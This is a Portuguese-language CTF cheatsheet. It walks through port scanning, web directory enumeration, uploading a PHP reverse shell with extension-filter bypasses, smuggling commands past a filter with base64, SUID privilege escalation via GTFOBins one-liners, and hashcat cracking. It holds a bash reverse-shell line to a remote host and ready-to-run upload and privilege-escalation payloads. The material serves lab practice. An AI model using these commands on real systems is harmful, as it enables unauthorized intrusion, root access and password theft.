# CTF Cheatsheet — Guia de Acesso Rápido

---
## 0. Abrir VPN

```bash
sudo openvpn vpn_file
```


## 1. Reconhecimento (Recon)

### Scan de portas — nmap
```bash
nmap -T4 <IP>                    # scan rápido das portas comuns
nmap -T4 -p- <IP>                # todas as 65535 portas
nmap -sV -sC <IP>                # versão dos serviços + scripts padrão
nmap -sV -p 22,80 <IP>           # versão só nas portas de interesse
```
- `-T4` = timing agressivo (rápido)
- `-sV` = detecta versão do serviço (ex.: `Apache 2.4.41`)
- `-sC` = roda scripts NSE padrão

### Meu IP (para reverse shell)
```bash
ifconfig            # olhar a interface tun0/eth0
ip a                # alternativa
```

---

## 2. Enumeração de diretórios web

### gobuster
```bash
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
- `-x` = testa extensões (útil pra achar `index.php`, `upload.php`)
- Diretórios comuns a procurar: `/panel`, `/uploads`, `/admin`, `/css`, `/js`

### Alternativas
```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt
feroxbuster -u http://<IP> -w /usr/share/wordlists/dirb/common.txt
```

Status codes úteis: `200` (existe), `301/302` (redirect/dir), `403` (existe mas bloqueado).

---

## 3. File Upload → Reverse Shell

### Passo a passo
1. Baixar o PHP reverse shell:
   https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
2. Editar o arquivo com **meu IP** (`ifconfig`) e a porta (ex.: `1234`).
3. Trocar a extensão para burlar o filtro (ex.: `.php5` — ver seção 4).
4. Fazer upload no formulário (ex.: `/panel`).
5. Abrir listener no meu terminal:
   ```bash
   nc -l -v -n -p 1234
   ```
   - `-l` listen, `-v` verbose, `-n` sem DNS, `-p` porta
6. Acessar o arquivo enviado (ex.: `http://<IP>/uploads/shell.php5`) para disparar a shell.
7. Navegar até a flag:
   ```bash
   cd /var/www
   cat user.txt
   ```

### Estabilizar a shell (TTY)
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z, depois no host:  stty raw -echo; fg
```

---

## 4. Bypass de restrição de upload (extensão)

Referência completa:
https://jorgectf.gitbook.io/awae-oswe-preparation-resources/by-vulnerability/file-upload-restrictions-bypass/file-extension-filters-bypass

### Extensões PHP alternativas (quando `.php` é bloqueado)
```
.php   .php2  .php3  .php4  .php5  .php7
.phtml .pht   .phar  .phps  .pgif  .phtm
```

### Outras técnicas
```
shell.php.jpg          # dupla extensão
shell.php%00.jpg       # null byte (PHP antigo)
shell.pHp              # variação de maiúsculas/minúsculas
shell.php.             # ponto/espaço no final
```
- **Magic bytes / Content-Type**: adicionar header de imagem (`GIF89a;`) no início ou trocar `Content-Type: image/png` no Burp.
- **`.htaccess`**: se puder subir um `.htaccess`, force o Apache a interpretar sua extensão como PHP:
  ```
  AddType application/x-httpd-php .jpg
  ```

---

## 5. Bypass de comando com Base64

Às vezes há um text box para entrada de comando, mas ele filtra/verifica comandos (ex.: bloqueia `ls`, `cat`, espaços). Codifique em base64 e decodifique no alvo.

### Codificar no meu terminal
```bash
echo -n "ls -la" | base64
# saída: bHMgLWxh
```
- `-n` evita a quebra de linha (senão o base64 sai diferente)

### Colar no text box (alvo decodifica e executa)
```bash
echo "bHMgLWxh" | base64 -d | bash
```

Serve para qualquer comando — reverse shell, leitura de arquivo, etc.:
```bash
echo -n "bash -i >& /dev/tcp/10.0.0.1/1234 0>&1" | base64
echo "<STRING_B64>" | base64 -d | bash
```

---

## 6. Escalação de Privilégio

### Achar binários SUID (rodam como dono, geralmente root)
```bash
find / -perm -4000 -type f 2>/dev/null
```
- `-perm -4000` = bit SUID setado
- `2>/dev/null` = descarta os erros de permissão
- Procure o binário "estranho"/fora do padrão (ex.: `python2.7`, `find`, `vim`, `nmap`, `bash`).

### GTFOBins — o site-chave da escalação
https://gtfobins.github.io/

O GTFOBins lista binários Unix legítimos e como abusar deles para **quebrar restrições** ou **escalar privilégio**. Fluxo de uso:

1. Rode `find / -perm -4000 -type f 2>/dev/null` e pegue o binário suspeito.
2. Busque o nome do binário no GTFOBins.
3. Filtre pela função relevante:
   - **SUID** → escala via bit SUID
   - **Sudo** → abusa de `sudo <bin>` (rode `sudo -l` para ver o que é permitido)
   - **Capabilities** → abusa de `getcap`
   - **Shell / File read / File write** → primitivas para ler/escrever/rodar
4. Copie o comando pronto e execute.

Exemplo (Python SUID, do passo.md):
```bash
/usr/bin/python2.7 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
# -p mantém os privilégios (não dropa o SUID)
cd /root
cat root.txt
```

Outros exemplos comuns do GTFOBins (SUID):
```bash
# find
./find . -exec /bin/sh -p \; -quit
# bash
./bash -p
# vim
./vim -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
# nmap (modo interativo, versões antigas)
./nmap --interactive
```

### Enumeração automática de privesc
```bash
sudo -l                          # o que posso rodar como sudo
./linpeas.sh                     # enumeração completa
find / -writable -type d 2>/dev/null
```

---

## 7. Identificação e Quebra de Hash

### Identificar o tipo de hash
Ferramentas locais (Kali):
- **hash-identifier** — https://www.kali.org/tools/hash-identifier/
- **hashid** — https://www.kali.org/tools/hashid/ (também dá o `-m` do hashcat)
```bash
hashid -m '<hash>'      # -m mostra o modo (algoritmo) do hashcat
hash-identifier         # interativo
```
Hash-examples:
- https://hashcat.net/wiki/doku.php?id=example_hashes


Sites online:
- CyberChef — https://gchq.github.io/CyberChef/ (Magic detecta e decoda)
- TunnelsUP Hash Analyzer — https://www.tunnelsup.com/hash-analyzer/
- 10015 MD5 tool — https://10015.io/tools/md5-encrypt-decrypt
- CrackStation — https://crackstation.net/ (lookup em rainbow tables, rápido pra hashes sem salt)

### hashcat — foco na quebra
Doc/tool: https://www.kali.org/tools/hashcat/

```bash
hashcat --help                                   # lista modos (-m) e ataques (-a)
hashcat -m <algo> -a <forma> hash.txt <dicionario/mascara/_>
```

**`-m <algo>`** = tipo do hash (achado com `hashid` ou `--help`):
| Modo | Algoritmo |
|------|-----------|
| 0    | MD5 |
| 100  | SHA1 |
| 1400 | SHA-256 |
| 1800 | sha512crypt `$6$` (/etc/shadow) |
| 500  | md5crypt `$1$` |
| 3200 | bcrypt `$2*$` |
| 1000 | NTLM |

**`-a <forma>`** = tipo de ataque:
| Ataque | Descrição |
|--------|-----------|
| 0 | Straight (dicionário/wordlist) |
| 3 | Brute-force / máscara |
| 6 | Híbrido wordlist + máscara |

### Exemplos práticos
```bash
# Dicionário (mais comum)
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt

# Dicionário + regras (variações de senha)
hashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Máscara / brute-force (ex.: 6 dígitos)
hashcat -m 0 -a 3 hash.txt ?d?d?d?d?d?d

# Shadow (sha512crypt)
hashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Máscaras** (para `-a 3`):
```
?l = a-z    ?u = A-Z    ?d = 0-9    ?s = símbolos    ?a = todos
```

### Máscara customizada (`-1 -2 -3 -4`)

Quando cada posição da senha pode ser mais de um conjunto (ex.: dígito **ou** maiúscula **ou** minúscula), define um charset próprio com `-1` e usa `?1` na máscara.

```bash
# cada posição = [0-9] ou [A-Z] ou [a-z], senha de 6 chars
hashcat -m 0 -a 3 add3.txt -1 ?d?u?l ?1?1?1?1?1?1
```
- `-1 ?d?u?l` = charset 1 é a união de dígitos + maiúsculas + minúsculas
- `?1` na máscara = "use o charset 1 aqui" (equivale ao seu `?dul` da ideia inicial)
- Dá pra ter até 4 charsets: `-1 -2 -3 -4` → referenciados por `?1 ?2 ?3 ?4`

```bash
# exemplo com 2 charsets: 1ª letra maiúscula, resto minúsculo, 2 dígitos no fim
hashcat -m 0 -a 3 hash.txt -1 ?u -2 ?l ?1?2?2?2?2?2?d?d

# charset literal (só esses caracteres)
hashcat -m 0 -a 3 hash.txt -1 abcdef0123456789 ?1?1?1?1?1?1

# combinando com chars fixos (prefixo conhecido "CTF-")
hashcat -m 0 -a 3 hash.txt -1 ?d?u?l CTF-?1?1?1?1
```

### Tamanho variável — `--increment`
```bash
# testa senhas de 1 até 6 chars usando o charset custom
hashcat -m 0 -a 3 hash.txt -1 ?d?u?l --increment --increment-min 1 --increment-max 6 ?1?1?1?1?1?1
```

### Ver o resultado
```bash
hashcat -m 0 hash.txt --show        # mostra hashes já quebrados (potfile)
hashcat --status                    # progresso durante a execução
```

Dica: se `rockyou` estiver comprimido → `gunzip /usr/share/wordlists/rockyou.txt.gz`

---

## Referência rápida — ordem típica num CTF

1. `nmap -sV -sC <IP>` → mapear serviços
2. `gobuster dir` → achar diretórios/`/upload`
3. Upload de reverse shell (bypass de extensão se preciso) + `nc -lvnp`
4. Estabilizar TTY, pegar `user.txt`
5. `find / -perm -4000 2>/dev/null` + **GTFOBins** → root
6. `cat root.txt` / quebrar hashes com **hashcat**
